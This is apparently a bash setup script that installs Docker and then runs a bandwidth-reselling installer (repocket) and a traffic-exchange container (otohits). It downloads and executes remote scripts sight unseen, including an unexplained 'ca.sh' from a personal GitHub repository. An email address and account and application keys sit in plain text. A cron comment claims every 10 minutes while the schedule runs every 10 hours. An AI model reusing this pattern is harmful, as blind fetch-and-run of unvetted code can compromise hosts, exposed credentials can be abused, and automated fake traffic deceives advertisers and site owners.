#!/bin/bash

# Update and upgrade packages
sudo apt update && sudo apt upgrade -y

# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh && sudo sh get-docker.sh

# Install repocket
curl -L https://raw.githubusercontent.com/spiritLHLS/repocket-one-click-command-installation/main/repocket.sh -o repocket.sh && chmod +x repocket.sh && yes | bash repocket.sh -m beformine@gmail.com -p d93c5411-5085-4631-8120-50de52c1253a

# Add cron job to restart Docker every 10 minutes
(crontab -l 2>/dev/null; echo "0 */10 * * * docker restart \$(docker ps -q)") | crontab -

# Download ca.sh script and execute it
curl -o ca.sh https://raw.githubusercontent.com/xDealer/adsh/main/ca.sh && chmod +x ca.sh && ./ca.sh

# Pull and run the Docker image without requiring manual intervention
docker run -e APPLICATION_KEY=6adfa338-57d0-4112-9476-a1c49ee19828 -d otohits/app:latest
